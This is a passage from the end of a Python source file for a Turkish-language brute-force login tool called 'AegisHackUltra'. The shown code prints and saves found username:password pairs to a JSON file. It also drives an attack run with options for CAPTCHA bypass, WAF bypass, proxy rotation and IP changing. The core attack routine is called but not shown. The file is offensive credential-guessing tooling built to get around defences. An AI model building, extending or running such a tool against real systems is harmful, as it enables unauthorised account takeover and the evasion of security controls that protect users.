        """Ultra detaylı final raporu"""
        if self.start_time:
            total_time = time.time() - self.start_time
            total_combinations = len(self.username_list) * len(self.password_list)
            
            print(f"\n{Fore.RED}{'='*60}")
            print(f"{Fore.RED}[⚡ SALDIRI RAPORU]")
            print(f"{Fore.RED}{'='*60}")
            print(f"{Fore.WHITE}Hedef: {self.target}:{self.port} ({self.protocol.upper()})")
            print(f"{Fore.WHITE}Toplam Kombinasyon: {total_combinations}")
            print(f"{Fore.WHITE}Denenen: {self.total_attempts}")
            print(f"{Fore.GREEN}Başarılı: {self.successful_attempts}")
            print(f"{Fore.RED}Başarısız: {self.failed_attempts}")
            print(f"{Fore.WHITE}Süre: {total_time:.2f} saniye")
            print(f"{Fore.YELLOW}Hız: {self.total_attempts/total_time:.1f} deneme/s")
            print(f"{Fore.CYAN}Thread Sayısı: {self.threads}")
            
            # Güvenlik özellikleri raporu
            print(f"\n{Fore.MAGENTA}[🛡️ GÜVENLİK ÖZELLİKLERİ]")
            print(f"{Fore.WHITE}CAPTCHA Algılandı: {'Evet' if self.captcha_detected else 'Hayır'}")
            print(f"{Fore.WHITE}WAF Algılandı: {'Evet' if self.waf_detected else 'Hayır'}")
            print(f"{Fore.WHITE}IP Değiştirme: {'Aktif' if self.real_ip_change else 'Pasif'}")
            print(f"{Fore.WHITE}Proxy Rotation: {'Aktif' if self.use_proxy else 'Pasif'}")
            
            if self.successful_creds:
                print(f"\n{Fore.GREEN}[🎯 BAŞARILI KİMLİK BİLGİLERİ]")
                for username, password in self.successful_creds:
                    print(f"{Fore.GREEN}  • {username}:{password}")
            
            self.save_results()
    
    def save_results(self):
        """Sonuçları kaydet"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"aegishack_ultra_{timestamp}.json"
        
        results = {
            'target': f"{self.target}:{self.port}",
            'protocol': self.protocol,
            'timestamp': timestamp,
            'total_attempts': self.total_attempts,
            'successful_attempts': self.successful_attempts,
            'successful_credentials': self.successful_creds,
            'threads_used': self.threads,
            'ultra_fast_mode': self.ultra_fast_mode,
            'real_ip_change': self.real_ip_change,
            'captcha_detected': self.captcha_detected,
            'waf_detected': self.waf_detected,
            'security_features': {
                'captcha_bypass': self.bypass_captcha,
                'waf_bypass': self.bypass_waf,
                'proxy_rotation': self.use_proxy
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(f"{Fore.GREEN}[✓] sonuçlar kaydedildi: {filename}")
        except Exception as e:
            print(f"{Fore.RED}[!] Kaydetme hatası: {e}")
    
    def run(self):
        """Ana çalışma fonksiyonu"""
        self.print_banner()
        
        if not self.check_dependencies():
            return
        
        if not self.get_ethical_consent():
            return
        
        self.select_protocol()
        self.get_target_info()
        self.load_wordlists()
        self.configure_ultra_options()
        
        if not self.test_connection():
            print(f"{Fore.RED}[!] Hedef erişilemez. Program sonlandırılıyor...")
            return
        
        print(f"\n{Fore.YELLOW}[⚡ SALDIRI ÖZETİ]")
        print(f"{Fore.WHITE}Hedef: {self.target}:{self.port} ({self.protocol.upper()})")
        print(f"{Fore.WHITE}Toplam kombinasyon: {len(self.username_list) * len(self.password_list)}")
        print(f"{Fore.WHITE} Thread sayısı: {self.threads}")
        print(f"{Fore.WHITE} Fast Mode: {'Aktif' if self.ultra_fast_mode else 'Pasif'}")
        print(f"{Fore.WHITE}Real IP Change: {'Aktif' if self.real_ip_change else 'Pasif'}")
        print(f"{Fore.WHITE}CAPTCHA Bypass: {'Aktif' if self.bypass_captcha else 'Pasif'}")
        print(f"{Fore.WHITE}WAF Bypass: {'Aktif' if self.bypass_waf else 'Pasif'}")
        
        confirm = input(f"\n{Fore.RED} saldırıyı başlatmak istiyor musunuz? (EVET/hayır): ").strip()
        if confirm.upper() not in ['EVET', 'YES']:
            print(f"{Fore.RED}[!] saldırı iptal edildi.")
            return
        
        self.start_ultra_attack()

def main():
    """Ana ultra fonksiyon"""
    try:
        tool = AegisHackUltra()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] program kullanıcı tarafından durduruldu.")
    except Exception as e:
        print(f"\n{Fore.RED}[!] beklenmeyen hata: {e}")

if __name__ == "__main__":
    main()